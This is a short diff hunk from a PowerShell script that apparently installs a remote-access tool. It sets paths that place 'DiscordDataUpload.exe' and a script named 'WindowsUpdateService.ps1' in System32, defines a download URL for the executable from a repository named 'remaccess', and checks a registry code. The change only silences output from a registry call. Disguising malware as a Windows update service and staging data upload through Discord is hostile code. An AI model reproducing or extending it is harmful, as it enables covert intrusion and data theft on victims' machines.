@@ -6,7 +6,7 @@ $exepath =  "C:/Windows/System32/DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 if (-not (Test-Path $regPath)) {
-    New-Item -Path $regPath -Force
+    New-Item -Path $regPath -Force | Out-Null
 }
 $existingCode = (Get-ItemProperty -Path $regPath).Code
 if ($existingCode -match '^(6|0)\d{5}$') {
